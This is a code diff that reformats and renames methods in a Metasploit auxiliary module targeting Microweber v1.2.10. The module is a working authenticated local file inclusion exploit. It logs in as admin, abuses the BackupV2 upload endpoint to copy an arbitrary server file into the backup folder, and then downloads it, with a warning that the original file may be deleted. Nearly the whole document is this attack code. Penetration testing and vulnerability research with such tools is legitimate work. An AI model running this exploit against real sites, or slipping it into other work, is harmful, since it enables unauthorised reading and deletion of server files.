@@ -5,79 +5,79 @@
 
 class MetasploitModule < Msf::Auxiliary
   Rank = ExcellentRanking
-  
+
   include Msf::Exploit::Remote::HttpClient
-  
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Microweber v1.2.10 Local File Inclusion (Authenticated)",
-      'Description'    => %q{
-        Microweber v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
-        Upload function may delete the local file if the web service user has access.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Microweber v1.2.10 Local File Inclusion (Authenticated)',
+        'Description' => %q{
+          Microweber v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
+          Upload function may delete the local file if the web service user has access.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Talha Karakumru <talhakarakumru[at]gmail.com>'
         ],
-      'References'     =>
-        [
+        'References' => [
           ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
         ],
-      'Notes'          =>
-        {
+        'Notes' => {
           'SideEffects' => [ 'ARTIFACTS_ON_DISK', 'IOC_IN_LOGS' ],
           'Reliability' => [ 'REPEATABLE_SESSION' ],
-          'Stability'   => [ 'OS_RESOURCE_LOSS' ]
+          'Stability' => [ 'OS_RESOURCE_LOSS' ]
         },
-      'Targets'        =>
-        [
+        'Targets' => [
           [ 'Microweber v1.2.10', {} ]
         ],
-      'Privileged'     => true,
-      'DisclosureDate' => "2022-01-30"
-      ))
-  
+        'Privileged' => true,
+        'DisclosureDate' => '2022-01-30'
+      )
+    )
+
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
         OptString.new('ADMIN_USER', [true, 'The admin\'s username for Microweber']),
         OptString.new('ADMIN_PASS', [true, 'The admin\'s password for Microweber']),
         OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
-      ])
+      ]
+    )
   end
 
   def check
     check_version ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
   end
-  
+
   def check_version
     print_warning 'Triggering this vulnerability may delete the local file that is wanted to be read.'
     print_status 'Checking Microweber\'s version.'
-  
+
     res = send_request_cgi({
-      'method'    => 'GET',
-      'uri'       => normalize_uri(target_uri.path, 'admin', 'login')
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
     })
-  
+
     begin
       version = res.body[/Version:\s+\d+\.\d+\.\d+/].gsub(' ', '').gsub(':', ': ')
+      print_good 'Microweber ' + version
     rescue NoMethodError, TypeError
       return false
     end
-  
+
     if version.include?('Version: 1.2.10')
-      print_good 'Microweber ' + version
       return true
     end
 
     return false
   end
-  
-  def login
+
+  def try_login
     res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path, 'api', 'user_login'),
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),
       'vars_post' => {
         'username' => datastore['ADMIN_USER'],
         'password' => datastore['ADMIN_PASS'],
@@ -85,53 +85,53 @@ class MetasploitModule < Msf::Auxiliary
         'where_to' => 'admin_content'
       }
     })
-  
-    if res.headers['Content-Type'] == 'application/json'
-      jsonRes = res.get_json_document
-  
-      if res.code != 200
-        print_error 'Microweber cannot be reached.'
-        return false
-      end
 
-      if !jsonRes['error'].nil?
-        print_error jsonRes['error']
-        return false
-      end
-
-      if !jsonRes['success'].nil? && jsonRes['success'] == 'You are logged in'
-        print_good jsonRes['success']
-        @cookie = res.get_cookies
-        return true
-      end
-
-      print_error 'An unknown error occurred.'
+    if res.headers['Content-Type'] != 'application/json'
+      print_status res.body
       return false
     end
 
-    print_status res.body
-    return true  
+    json_res = res.get_json_document
+
+    if res.code != 200
+      print_error 'Microweber cannot be reached.'
+      return false
+    end
+
+    if !json_res['error'].nil?
+      print_error json_res['error']
+      return false
+    end
+
+    if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
+      print_good json_res['success']
+      @cookie = res.get_cookies
+      return true
+    end
+
+    print_error 'An unknown error occurred.'
+    return false
   end
-  
-  def upload
+
+  def try_upload
     print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'
     res = send_request_cgi({
-      'method'    => 'GET',
-      'uri'       => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
-      'cookie'    => @cookie,
-      'vars_get'  => {
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
+      'cookie' => @cookie,
+      'vars_get' => {
         'src' => datastore['LOCAL_FILE_PATH']
       },
-      'headers'   => {
+      'headers' => {
         'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
       }
     })
 
     if res.headers['Content-Type'] == 'application/json'
-      jsonRes = res.get_json_document
+      json_res = res.get_json_document
 
-      if jsonRes['success']
-        print_good jsonRes['success']
+      if json_res['success']
+        print_good json_res['success']
         return true
       end
     end
@@ -140,27 +140,27 @@ class MetasploitModule < Msf::Auxiliary
     return false
   end
 
-  def download
+  def try_download
     filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
     print_status 'Downloading ' + filename + ' from the backup folder.'
 
     res = send_request_cgi({
-      'method'    => 'GET',
-      'uri'       => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
-      'cookie'    => @cookie,
-      'vars_get'  => {
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
+      'cookie' => @cookie,
+      'vars_get' => {
         'filename' => filename
       },
-      'headers'   => {
+      'headers' => {
         'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
       }
     })
 
     if res.headers['Content-Type'] == 'application/json'
-      jsonRes = res.get_json_document
+      json_res = res.get_json_document
 
-      if jsonRes['error']
-        print_error jsonRes['error']
+      if json_res['error']
+        print_error json_res['error']
         return
       end
     end
@@ -169,16 +169,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    is_version_valid = check_version
-    is_login_valid = login
-
-    if !is_version_valid || !is_login_valid
+    if !check_version || !try_login
       return
     end
 
-    is_upload_successful = upload
-    if is_upload_successful
-      download
+    if try_upload
+      try_download
     end
   end
 end
